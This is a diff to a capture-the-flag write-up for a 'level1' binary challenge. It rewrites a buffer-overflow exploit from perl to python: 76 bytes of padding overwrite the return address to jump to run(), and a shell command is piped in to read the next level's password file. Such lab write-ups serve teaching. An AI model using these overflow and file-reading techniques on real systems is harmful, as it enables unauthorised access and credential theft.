@@ -27,13 +27,7 @@ Stack and heap memory CAN be executed (NX disabled)
 ### Exploit Strategy
 Fill buffer with 76 bytes of padding, overwrite return address with 0x08048444.
 ```bash
-perl -e 'print "A" x 76 . "\x44\x84\x04\x08\n"' | ./level1
-```
-
-### Execution
-```bash
-ssh level1@localhost -p 4242
-(perl -e 'print "A" x 76 . "\x44\x84\x04\x08\n"'; echo "cat /home/user/level2/.pass"; sleep 1) | ./level1
+python -c "print 'A'*76 + '\x44\x84\x04\x08'" | ./level1
 ```
 
 ### Why It Works
@@ -44,3 +38,6 @@ gets() overflows buffer, overwrites return address. main() returns to run() inst
 objdump -d ./level1 | grep "<run>:" # Find run() function
 strings ./level1 | grep "/bin/sh"  # Find /bin/sh string
 ```
+
+### Execution
+(python -c "print 'A'*76 + '\x44\x84\x04\x08'"; echo "cat /home/user/level2/.pass"; sleep 1) | ./level1
